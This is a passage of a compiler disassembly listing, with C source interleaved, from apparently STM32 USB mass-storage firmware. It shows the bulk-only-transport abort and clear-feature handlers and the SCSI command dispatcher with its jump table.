                         USBD_BOT_CSW_LENGTH);

  /* Prepare EP to Receive next Cmd */
  (void)USBD_LL_PrepareReceive(pdev, MSCOutEpAdd, (uint8_t *)&hmsc->cbw,
 80096a6:	4b09      	ldr	r3, [pc, #36]	; (80096cc <MSC_BOT_SendCSW+0x7c>)
 80096a8:	7819      	ldrb	r1, [r3, #0]
 80096aa:	68fb      	ldr	r3, [r7, #12]
 80096ac:	f503 5280 	add.w	r2, r3, #4096	; 0x1000
 80096b0:	3210      	adds	r2, #16
 80096b2:	231f      	movs	r3, #31
 80096b4:	6878      	ldr	r0, [r7, #4]
 80096b6:	f003 fbdf 	bl	800ce78 <USBD_LL_PrepareReceive>
 80096ba:	e000      	b.n	80096be <MSC_BOT_SendCSW+0x6e>
    return;
 80096bc:	bf00      	nop
                               USBD_BOT_CBW_LENGTH);
}
 80096be:	3710      	adds	r7, #16
 80096c0:	46bd      	mov	sp, r7
 80096c2:	bd80      	pop	{r7, pc}
 80096c4:	53425355 	.word	0x53425355
 80096c8:	2000010a 	.word	0x2000010a
 80096cc:	2000010b 	.word	0x2000010b

080096d0 <MSC_BOT_Abort>:
  * @param  pdev: device instance
  * @retval status
  */

static void  MSC_BOT_Abort(USBD_HandleTypeDef *pdev)
{
 80096d0:	b580      	push	{r7, lr}
 80096d2:	b084      	sub	sp, #16
 80096d4:	af00      	add	r7, sp, #0
 80096d6:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80096d8:	687b      	ldr	r3, [r7, #4]
 80096da:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80096de:	687b      	ldr	r3, [r7, #4]
 80096e0:	32b0      	adds	r2, #176	; 0xb0
 80096e2:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80096e6:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80096e8:	68fb      	ldr	r3, [r7, #12]
 80096ea:	2b00      	cmp	r3, #0
 80096ec:	d02c      	beq.n	8009748 <MSC_BOT_Abort+0x78>
  {
    return;
  }

  if ((hmsc->cbw.bmFlags == 0U) &&
 80096ee:	68fb      	ldr	r3, [r7, #12]
 80096f0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 80096f4:	7f1b      	ldrb	r3, [r3, #28]
 80096f6:	2b00      	cmp	r3, #0
 80096f8:	d10f      	bne.n	800971a <MSC_BOT_Abort+0x4a>
      (hmsc->cbw.dDataLength != 0U) &&
 80096fa:	68fb      	ldr	r3, [r7, #12]
 80096fc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009700:	699b      	ldr	r3, [r3, #24]
  if ((hmsc->cbw.bmFlags == 0U) &&
 8009702:	2b00      	cmp	r3, #0
 8009704:	d009      	beq.n	800971a <MSC_BOT_Abort+0x4a>
      (hmsc->bot_status == USBD_BOT_STATUS_NORMAL))
 8009706:	68fb      	ldr	r3, [r7, #12]
 8009708:	7a5b      	ldrb	r3, [r3, #9]
      (hmsc->cbw.dDataLength != 0U) &&
 800970a:	2b00      	cmp	r3, #0
 800970c:	d105      	bne.n	800971a <MSC_BOT_Abort+0x4a>
  {
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800970e:	4b10      	ldr	r3, [pc, #64]	; (8009750 <MSC_BOT_Abort+0x80>)
 8009710:	781b      	ldrb	r3, [r3, #0]
 8009712:	4619      	mov	r1, r3
 8009714:	6878      	ldr	r0, [r7, #4]
 8009716:	f003 faa7 	bl	800cc68 <USBD_LL_StallEP>
  }

  (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800971a:	4b0e      	ldr	r3, [pc, #56]	; (8009754 <MSC_BOT_Abort+0x84>)
 800971c:	781b      	ldrb	r3, [r3, #0]
 800971e:	4619      	mov	r1, r3
 8009720:	6878      	ldr	r0, [r7, #4]
 8009722:	f003 faa1 	bl	800cc68 <USBD_LL_StallEP>

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR)
 8009726:	68fb      	ldr	r3, [r7, #12]
 8009728:	7a5b      	ldrb	r3, [r3, #9]
 800972a:	2b02      	cmp	r3, #2
 800972c:	d10d      	bne.n	800974a <MSC_BOT_Abort+0x7a>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 800972e:	4b09      	ldr	r3, [pc, #36]	; (8009754 <MSC_BOT_Abort+0x84>)
 8009730:	781b      	ldrb	r3, [r3, #0]
 8009732:	4619      	mov	r1, r3
 8009734:	6878      	ldr	r0, [r7, #4]
 8009736:	f003 fa97 	bl	800cc68 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800973a:	4b05      	ldr	r3, [pc, #20]	; (8009750 <MSC_BOT_Abort+0x80>)
 800973c:	781b      	ldrb	r3, [r3, #0]
 800973e:	4619      	mov	r1, r3
 8009740:	6878      	ldr	r0, [r7, #4]
 8009742:	f003 fa91 	bl	800cc68 <USBD_LL_StallEP>
 8009746:	e000      	b.n	800974a <MSC_BOT_Abort+0x7a>
    return;
 8009748:	bf00      	nop
  }
}
 800974a:	3710      	adds	r7, #16
 800974c:	46bd      	mov	sp, r7
 800974e:	bd80      	pop	{r7, pc}
 8009750:	2000010b 	.word	0x2000010b
 8009754:	2000010a 	.word	0x2000010a

08009758 <MSC_BOT_CplClrFeature>:
  * @param  epnum: endpoint index
  * @retval None
  */

void  MSC_BOT_CplClrFeature(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009758:	b580      	push	{r7, lr}
 800975a:	b084      	sub	sp, #16
 800975c:	af00      	add	r7, sp, #0
 800975e:	6078      	str	r0, [r7, #4]
 8009760:	460b      	mov	r3, r1
 8009762:	70fb      	strb	r3, [r7, #3]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009764:	687b      	ldr	r3, [r7, #4]
 8009766:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800976a:	687b      	ldr	r3, [r7, #4]
 800976c:	32b0      	adds	r2, #176	; 0xb0
 800976e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009772:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 8009774:	68fb      	ldr	r3, [r7, #12]
 8009776:	2b00      	cmp	r3, #0
 8009778:	d01d      	beq.n	80097b6 <MSC_BOT_CplClrFeature+0x5e>
  {
    return;
  }

  if (hmsc->bot_status == USBD_BOT_STATUS_ERROR) /* Bad CBW Signature */
 800977a:	68fb      	ldr	r3, [r7, #12]
 800977c:	7a5b      	ldrb	r3, [r3, #9]
 800977e:	2b02      	cmp	r3, #2
 8009780:	d10c      	bne.n	800979c <MSC_BOT_CplClrFeature+0x44>
  {
    (void)USBD_LL_StallEP(pdev, MSCInEpAdd);
 8009782:	4b10      	ldr	r3, [pc, #64]	; (80097c4 <MSC_BOT_CplClrFeature+0x6c>)
 8009784:	781b      	ldrb	r3, [r3, #0]
 8009786:	4619      	mov	r1, r3
 8009788:	6878      	ldr	r0, [r7, #4]
 800978a:	f003 fa6d 	bl	800cc68 <USBD_LL_StallEP>
    (void)USBD_LL_StallEP(pdev, MSCOutEpAdd);
 800978e:	4b0e      	ldr	r3, [pc, #56]	; (80097c8 <MSC_BOT_CplClrFeature+0x70>)
 8009790:	781b      	ldrb	r3, [r3, #0]
 8009792:	4619      	mov	r1, r3
 8009794:	6878      	ldr	r0, [r7, #4]
 8009796:	f003 fa67 	bl	800cc68 <USBD_LL_StallEP>
 800979a:	e00f      	b.n	80097bc <MSC_BOT_CplClrFeature+0x64>
  }
  else if (((epnum & 0x80U) == 0x80U) && (hmsc->bot_status != USBD_BOT_STATUS_RECOVERY))
 800979c:	f997 3003 	ldrsb.w	r3, [r7, #3]
 80097a0:	2b00      	cmp	r3, #0
 80097a2:	da0a      	bge.n	80097ba <MSC_BOT_CplClrFeature+0x62>
 80097a4:	68fb      	ldr	r3, [r7, #12]
 80097a6:	7a5b      	ldrb	r3, [r3, #9]
 80097a8:	2b01      	cmp	r3, #1
 80097aa:	d006      	beq.n	80097ba <MSC_BOT_CplClrFeature+0x62>
  {
    MSC_BOT_SendCSW(pdev, USBD_CSW_CMD_FAILED);
 80097ac:	2101      	movs	r1, #1
 80097ae:	6878      	ldr	r0, [r7, #4]
 80097b0:	f7ff ff4e 	bl	8009650 <MSC_BOT_SendCSW>
 80097b4:	e002      	b.n	80097bc <MSC_BOT_CplClrFeature+0x64>
    return;
 80097b6:	bf00      	nop
 80097b8:	e000      	b.n	80097bc <MSC_BOT_CplClrFeature+0x64>
  }
  else
  {
    return;
 80097ba:	bf00      	nop
  }
}
 80097bc:	3710      	adds	r7, #16
 80097be:	46bd      	mov	sp, r7
 80097c0:	bd80      	pop	{r7, pc}
 80097c2:	bf00      	nop
 80097c4:	2000010a 	.word	0x2000010a
 80097c8:	2000010b 	.word	0x2000010b

080097cc <SCSI_ProcessCmd>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
int8_t SCSI_ProcessCmd(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *cmd)
{
 80097cc:	b580      	push	{r7, lr}
 80097ce:	b086      	sub	sp, #24
 80097d0:	af00      	add	r7, sp, #0
 80097d2:	60f8      	str	r0, [r7, #12]
 80097d4:	460b      	mov	r3, r1
 80097d6:	607a      	str	r2, [r7, #4]
 80097d8:	72fb      	strb	r3, [r7, #11]
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80097da:	68fb      	ldr	r3, [r7, #12]
 80097dc:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80097e0:	68fb      	ldr	r3, [r7, #12]
 80097e2:	32b0      	adds	r2, #176	; 0xb0
 80097e4:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80097e8:	613b      	str	r3, [r7, #16]

  if (hmsc == NULL)
 80097ea:	693b      	ldr	r3, [r7, #16]
 80097ec:	2b00      	cmp	r3, #0
 80097ee:	d102      	bne.n	80097f6 <SCSI_ProcessCmd+0x2a>
  {
    return -1;
 80097f0:	f04f 33ff 	mov.w	r3, #4294967295
 80097f4:	e168      	b.n	8009ac8 <SCSI_ProcessCmd+0x2fc>
  }

  switch (cmd[0])
 80097f6:	687b      	ldr	r3, [r7, #4]
 80097f8:	781b      	ldrb	r3, [r3, #0]
 80097fa:	2baa      	cmp	r3, #170	; 0xaa
 80097fc:	f000 8144 	beq.w	8009a88 <SCSI_ProcessCmd+0x2bc>
 8009800:	2baa      	cmp	r3, #170	; 0xaa
 8009802:	f300 8153 	bgt.w	8009aac <SCSI_ProcessCmd+0x2e0>
 8009806:	2ba8      	cmp	r3, #168	; 0xa8
 8009808:	f000 812c 	beq.w	8009a64 <SCSI_ProcessCmd+0x298>
 800980c:	2ba8      	cmp	r3, #168	; 0xa8
 800980e:	f300 814d 	bgt.w	8009aac <SCSI_ProcessCmd+0x2e0>
 8009812:	2b5a      	cmp	r3, #90	; 0x5a
 8009814:	f300 80c0 	bgt.w	8009998 <SCSI_ProcessCmd+0x1cc>
 8009818:	2b00      	cmp	r3, #0
 800981a:	f2c0 8147 	blt.w	8009aac <SCSI_ProcessCmd+0x2e0>
 800981e:	2b5a      	cmp	r3, #90	; 0x5a
 8009820:	f200 8144 	bhi.w	8009aac <SCSI_ProcessCmd+0x2e0>
 8009824:	a201      	add	r2, pc, #4	; (adr r2, 800982c <SCSI_ProcessCmd+0x60>)
 8009826:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800982a:	bf00      	nop
 800982c:	0800999f 	.word	0x0800999f
 8009830:	08009aad 	.word	0x08009aad
 8009834:	08009aad 	.word	0x08009aad
 8009838:	080099b1 	.word	0x080099b1
 800983c:	08009aad 	.word	0x08009aad
 8009840:	08009aad 	.word	0x08009aad
 8009844:	08009aad 	.word	0x08009aad
 8009848:	08009aad 	.word	0x08009aad
 800984c:	08009aad 	.word	0x08009aad
 8009850:	08009aad 	.word	0x08009aad
 8009854:	08009aad 	.word	0x08009aad
 8009858:	08009aad 	.word	0x08009aad
 800985c:	08009aad 	.word	0x08009aad
 8009860:	08009aad 	.word	0x08009aad
 8009864:	08009aad 	.word	0x08009aad
 8009868:	08009aad 	.word	0x08009aad
 800986c:	08009aad 	.word	0x08009aad
 8009870:	08009aad 	.word	0x08009aad
 8009874:	080099c3 	.word	0x080099c3
 8009878:	08009aad 	.word	0x08009aad
 800987c:	08009aad 	.word	0x08009aad
 8009880:	08009aad 	.word	0x08009aad
 8009884:	08009aad 	.word	0x08009aad
 8009888:	08009aad 	.word	0x08009aad
 800988c:	08009aad 	.word	0x08009aad
 8009890:	08009aad 	.word	0x08009aad
 8009894:	080099f9 	.word	0x080099f9
 8009898:	080099d5 	.word	0x080099d5
 800989c:	08009aad 	.word	0x08009aad
 80098a0:	08009aad 	.word	0x08009aad
 80098a4:	080099e7 	.word	0x080099e7
 80098a8:	08009aad 	.word	0x08009aad
 80098ac:	08009aad 	.word	0x08009aad
 80098b0:	08009aad 	.word	0x08009aad
 80098b4:	08009aad 	.word	0x08009aad
 80098b8:	08009a1d 	.word	0x08009a1d
 80098bc:	08009aad 	.word	0x08009aad
 80098c0:	08009a2f 	.word	0x08009a2f
 80098c4:	08009aad 	.word	0x08009aad
 80098c8:	08009aad 	.word	0x08009aad
 80098cc:	08009a53 	.word	0x08009a53
 80098d0:	08009aad 	.word	0x08009aad
 80098d4:	08009a77 	.word	0x08009a77
 80098d8:	08009aad 	.word	0x08009aad
 80098dc:	08009aad 	.word	0x08009aad
 80098e0:	08009aad 	.word	0x08009aad
 80098e4:	08009aad 	.word	0x08009aad
 80098e8:	08009a9b 	.word	0x08009a9b
 80098ec:	08009aad 	.word	0x08009aad
 80098f0:	08009aad 	.word	0x08009aad
 80098f4:	08009aad 	.word	0x08009aad
 80098f8:	08009aad 	.word	0x08009aad
 80098fc:	08009aad 	.word	0x08009aad
 8009900:	08009aad 	.word	0x08009aad
 8009904:	08009aad 	.word	0x08009aad
 8009908:	08009aad 	.word	0x08009aad
 800990c:	08009aad 	.word	0x08009aad
 8009910:	08009aad 	.word	0x08009aad
 8009914:	08009aad 	.word	0x08009aad
 8009918:	08009aad 	.word	0x08009aad
 800991c:	08009aad 	.word	0x08009aad
 8009920:	08009aad 	.word	0x08009aad
 8009924:	08009aad 	.word	0x08009aad
 8009928:	08009aad 	.word	0x08009aad
 800992c:	08009aad 	.word	0x08009aad
 8009930:	08009aad 	.word	0x08009aad
 8009934:	08009aad 	.word	0x08009aad
 8009938:	08009aad 	.word	0x08009aad
 800993c:	08009aad 	.word	0x08009aad
 8009940:	08009aad 	.word	0x08009aad
 8009944:	08009aad 	.word	0x08009aad
 8009948:	08009aad 	.word	0x08009aad
 800994c:	08009aad 	.word	0x08009aad
 8009950:	08009aad 	.word	0x08009aad
 8009954:	08009aad 	.word	0x08009aad
 8009958:	08009aad 	.word	0x08009aad
 800995c:	08009aad 	.word	0x08009aad
 8009960:	08009aad 	.word	0x08009aad
 8009964:	08009aad 	.word	0x08009aad
 8009968:	08009aad 	.word	0x08009aad
 800996c:	08009aad 	.word	0x08009aad
 8009970:	08009aad 	.word	0x08009aad
 8009974:	08009aad 	.word	0x08009aad
 8009978:	08009aad 	.word	0x08009aad
 800997c:	08009aad 	.word	0x08009aad
 8009980:	08009aad 	.word	0x08009aad
 8009984:	08009aad 	.word	0x08009aad
 8009988:	08009aad 	.word	0x08009aad
 800998c:	08009aad 	.word	0x08009aad
 8009990:	08009aad 	.word	0x08009aad
 8009994:	08009a0b 	.word	0x08009a0b
 8009998:	2b9e      	cmp	r3, #158	; 0x9e
 800999a:	d051      	beq.n	8009a40 <SCSI_ProcessCmd+0x274>
 800999c:	e086      	b.n	8009aac <SCSI_ProcessCmd+0x2e0>
  {
    case SCSI_TEST_UNIT_READY:
      ret = SCSI_TestUnitReady(pdev, lun, cmd);
 800999e:	7afb      	ldrb	r3, [r7, #11]
 80099a0:	687a      	ldr	r2, [r7, #4]
 80099a2:	4619      	mov	r1, r3
 80099a4:	68f8      	ldr	r0, [r7, #12]
 80099a6:	f000 f893 	bl	8009ad0 <SCSI_TestUnitReady>
 80099aa:	4603      	mov	r3, r0
 80099ac:	75fb      	strb	r3, [r7, #23]
      break;
 80099ae:	e089      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_REQUEST_SENSE:
      ret = SCSI_RequestSense(pdev, lun, cmd);
 80099b0:	7afb      	ldrb	r3, [r7, #11]
 80099b2:	687a      	ldr	r2, [r7, #4]
 80099b4:	4619      	mov	r1, r3
 80099b6:	68f8      	ldr	r0, [r7, #12]
 80099b8:	f000 fb9a 	bl	800a0f0 <SCSI_RequestSense>
 80099bc:	4603      	mov	r3, r0
 80099be:	75fb      	strb	r3, [r7, #23]
      break;
 80099c0:	e080      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_INQUIRY:
      ret = SCSI_Inquiry(pdev, lun, cmd);
 80099c2:	7afb      	ldrb	r3, [r7, #11]
 80099c4:	687a      	ldr	r2, [r7, #4]
 80099c6:	4619      	mov	r1, r3
 80099c8:	68f8      	ldr	r0, [r7, #12]
 80099ca:	f000 f8df 	bl	8009b8c <SCSI_Inquiry>
 80099ce:	4603      	mov	r3, r0
 80099d0:	75fb      	strb	r3, [r7, #23]
      break;
 80099d2:	e077      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_START_STOP_UNIT:
      ret = SCSI_StartStopUnit(pdev, lun, cmd);
 80099d4:	7afb      	ldrb	r3, [r7, #11]
 80099d6:	687a      	ldr	r2, [r7, #4]
 80099d8:	4619      	mov	r1, r3
 80099da:	68f8      	ldr	r0, [r7, #12]
 80099dc:	f000 fc7e 	bl	800a2dc <SCSI_StartStopUnit>
 80099e0:	4603      	mov	r3, r0
 80099e2:	75fb      	strb	r3, [r7, #23]
      break;
 80099e4:	e06e      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_ALLOW_MEDIUM_REMOVAL:
      ret = SCSI_AllowPreventRemovable(pdev, lun, cmd);
 80099e6:	7afb      	ldrb	r3, [r7, #11]
 80099e8:	687a      	ldr	r2, [r7, #4]
 80099ea:	4619      	mov	r1, r3
 80099ec:	68f8      	ldr	r0, [r7, #12]
 80099ee:	f000 fcd2 	bl	800a396 <SCSI_AllowPreventRemovable>
 80099f2:	4603      	mov	r3, r0
 80099f4:	75fb      	strb	r3, [r7, #23]
      break;
 80099f6:	e065      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE6:
      ret = SCSI_ModeSense6(pdev, lun, cmd);
 80099f8:	7afb      	ldrb	r3, [r7, #11]
 80099fa:	687a      	ldr	r2, [r7, #4]
 80099fc:	4619      	mov	r1, r3
 80099fe:	68f8      	ldr	r0, [r7, #12]
 8009a00:	f000 fb16 	bl	800a030 <SCSI_ModeSense6>
 8009a04:	4603      	mov	r3, r0
 8009a06:	75fb      	strb	r3, [r7, #23]
      break;
 8009a08:	e05c      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 8009a0a:	7afb      	ldrb	r3, [r7, #11]
 8009a0c:	687a      	ldr	r2, [r7, #4]
 8009a0e:	4619      	mov	r1, r3
 8009a10:	68f8      	ldr	r0, [r7, #12]
 8009a12:	f000 fb3d 	bl	800a090 <SCSI_ModeSense10>
 8009a16:	4603      	mov	r3, r0
 8009a18:	75fb      	strb	r3, [r7, #23]
      break;
 8009a1a:	e053      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 8009a1c:	7afb      	ldrb	r3, [r7, #11]
 8009a1e:	687a      	ldr	r2, [r7, #4]
 8009a20:	4619      	mov	r1, r3
 8009a22:	68f8      	ldr	r0, [r7, #12]
 8009a24:	f000 fa86 	bl	8009f34 <SCSI_ReadFormatCapacity>
 8009a28:	4603      	mov	r3, r0
 8009a2a:	75fb      	strb	r3, [r7, #23]
      break;
 8009a2c:	e04a      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009a2e:	7afb      	ldrb	r3, [r7, #11]
 8009a30:	687a      	ldr	r2, [r7, #4]
 8009a32:	4619      	mov	r1, r3
 8009a34:	68f8      	ldr	r0, [r7, #12]
 8009a36:	f000 f929 	bl	8009c8c <SCSI_ReadCapacity10>
 8009a3a:	4603      	mov	r3, r0
 8009a3c:	75fb      	strb	r3, [r7, #23]
      break;
 8009a3e:	e041      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009a40:	7afb      	ldrb	r3, [r7, #11]
 8009a42:	687a      	ldr	r2, [r7, #4]
 8009a44:	4619      	mov	r1, r3
 8009a46:	68f8      	ldr	r0, [r7, #12]
 8009a48:	f000 f9af 	bl	8009daa <SCSI_ReadCapacity16>
 8009a4c:	4603      	mov	r3, r0
 8009a4e:	75fb      	strb	r3, [r7, #23]
      break;
 8009a50:	e038      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009a52:	7afb      	ldrb	r3, [r7, #11]
 8009a54:	687a      	ldr	r2, [r7, #4]
 8009a56:	4619      	mov	r1, r3
 8009a58:	68f8      	ldr	r0, [r7, #12]
 8009a5a:	f000 fccd 	bl	800a3f8 <SCSI_Read10>
 8009a5e:	4603      	mov	r3, r0
 8009a60:	75fb      	strb	r3, [r7, #23]
      break;
 8009a62:	e02f      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009a64:	7afb      	ldrb	r3, [r7, #11]
 8009a66:	687a      	ldr	r2, [r7, #4]
 8009a68:	4619      	mov	r1, r3
 8009a6a:	68f8      	ldr	r0, [r7, #12]
 8009a6c:	f000 fd7b 	bl	800a566 <SCSI_Read12>
 8009a70:	4603      	mov	r3, r0
 8009a72:	75fb      	strb	r3, [r7, #23]
      break;
 8009a74:	e026      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009a76:	7afb      	ldrb	r3, [r7, #11]
 8009a78:	687a      	ldr	r2, [r7, #4]
 8009a7a:	4619      	mov	r1, r3
 8009a7c:	68f8      	ldr	r0, [r7, #12]
 8009a7e:	f000 fe33 	bl	800a6e8 <SCSI_Write10>
 8009a82:	4603      	mov	r3, r0
 8009a84:	75fb      	strb	r3, [r7, #23]
      break;
 8009a86:	e01d      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009a88:	7afb      	ldrb	r3, [r7, #11]
 8009a8a:	687a      	ldr	r2, [r7, #4]
 8009a8c:	4619      	mov	r1, r3
 8009a8e:	68f8      	ldr	r0, [r7, #12]
 8009a90:	f000 ff0e 	bl	800a8b0 <SCSI_Write12>
 8009a94:	4603      	mov	r3, r0
 8009a96:	75fb      	strb	r3, [r7, #23]
      break;
 8009a98:	e014      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009a9a:	7afb      	ldrb	r3, [r7, #11]
 8009a9c:	687a      	ldr	r2, [r7, #4]
 8009a9e:	4619      	mov	r1, r3
 8009aa0:	68f8      	ldr	r0, [r7, #12]
 8009aa2:	f000 fff9 	bl	800aa98 <SCSI_Verify10>
 8009aa6:	4603      	mov	r3, r0
 8009aa8:	75fb      	strb	r3, [r7, #23]
      break;
 8009aaa:	e00b      	b.n	8009ac4 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009aac:	7af9      	ldrb	r1, [r7, #11]
 8009aae:	2320      	movs	r3, #32
 8009ab0:	2205      	movs	r2, #5
 8009ab2:	68f8      	ldr	r0, [r7, #12]
 8009ab4:	f000 fbb6 	bl	800a224 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009ab8:	693b      	ldr	r3, [r7, #16]
 8009aba:	2202      	movs	r2, #2
 8009abc:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009abe:	23ff      	movs	r3, #255	; 0xff
 8009ac0:	75fb      	strb	r3, [r7, #23]
      break;
 8009ac2:	bf00      	nop
  }

  return ret;
 8009ac4:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009ac8:	4618      	mov	r0, r3
 8009aca:	3718      	adds	r7, #24
 8009acc:	46bd      	mov	sp, r7
 8009ace:	bd80      	pop	{r7, pc}

08009ad0 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009ad0:	b580      	push	{r7, lr}
 8009ad2:	b086      	sub	sp, #24
 8009ad4:	af00      	add	r7, sp, #0
 8009ad6:	60f8      	str	r0, [r7, #12]
 8009ad8:	460b      	mov	r3, r1
 8009ada:	607a      	str	r2, [r7, #4]
 8009adc:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009ade:	68fb      	ldr	r3, [r7, #12]
 8009ae0:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ae4:	68fb      	ldr	r3, [r7, #12]
 8009ae6:	32b0      	adds	r2, #176	; 0xb0
 8009ae8:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009aec:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009aee:	697b      	ldr	r3, [r7, #20]
 8009af0:	2b00      	cmp	r3, #0
 8009af2:	d102      	bne.n	8009afa <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009af4:	f04f 33ff 	mov.w	r3, #4294967295
 8009af8:	e043      	b.n	8009b82 <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009afa:	697b      	ldr	r3, [r7, #20]
 8009afc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b00:	699b      	ldr	r3, [r3, #24]
 8009b02:	2b00      	cmp	r3, #0
 8009b04:	d00b      	beq.n	8009b1e <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009b06:	697b      	ldr	r3, [r7, #20]
 8009b08:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b0c:	7f59      	ldrb	r1, [r3, #29]
 8009b0e:	2320      	movs	r3, #32
 8009b10:	2205      	movs	r2, #5
 8009b12:	68f8      	ldr	r0, [r7, #12]
 8009b14:	f000 fb86 	bl	800a224 <SCSI_SenseCode>

    return -1;
 8009b18:	f04f 33ff 	mov.w	r3, #4294967295
 8009b1c:	e031      	b.n	8009b82 <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009b1e:	697b      	ldr	r3, [r7, #20]
 8009b20:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009b24:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009b28:	2b02      	cmp	r3, #2
 8009b2a:	d10b      	bne.n	8009b44 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009b2c:	7af9      	ldrb	r1, [r7, #11]
 8009b2e:	233a      	movs	r3, #58	; 0x3a
 8009b30:	2202      	movs	r2, #2
 8009b32:	68f8      	ldr	r0, [r7, #12]
 8009b34:	f000 fb76 	bl	800a224 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009b38:	697b      	ldr	r3, [r7, #20]
 8009b3a:	2205      	movs	r2, #5
 8009b3c:	721a      	strb	r2, [r3, #8]
    return -1;
 8009b3e:	f04f 33ff 	mov.w	r3, #4294967295
 8009b42:	e01e      	b.n	8009b82 <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
